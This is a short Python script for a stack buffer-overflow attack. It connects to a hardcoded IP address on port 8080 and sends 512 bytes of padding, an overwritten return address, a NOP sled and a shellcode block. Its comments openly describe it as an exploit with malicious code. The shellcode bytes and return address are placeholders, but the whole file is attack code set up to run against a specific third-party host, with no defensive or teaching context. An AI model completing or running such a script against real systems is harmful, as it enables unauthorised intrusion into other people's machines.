import socket
import struct

def exploit(target_ip, target_port):
    # Create a socket object using IPv4 addressing and TCP protocol
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the target IP and port
    s.connect((target_ip, target_port))

    # Create a NOP sled (a series of no-operation instructions) for potential buffer overflow
    nop_slide = b'\x90' * 16

    # Create a shellcode (malicious code) that will be executed upon exploitation
    shellcode = b'\xcc' * 60

    # Pack the return address in little-endian format to overwrite the EIP/RIP register
    return_address = struct.pack('<L', 0xdeadbeef)

    # Construct the payload with padding, return address, NOP sled, and shellcode
    payload = b'A' * 512 + return_address + nop_slide + shellcode

    # Send the payload to the target
    s.send(payload)

    # Receive and store the response from the target
    response = s.recv(1024)

    # Print the response received from the target
    print(response)

    # Close the socket connection
    s.close()

# Target IP and port to exploit
target_ip = '155.155.155.155'
target_port = 8080  # Use an integer for the port number

# Call the exploit function with the specified target IP and port
exploit(target_ip, target_port)
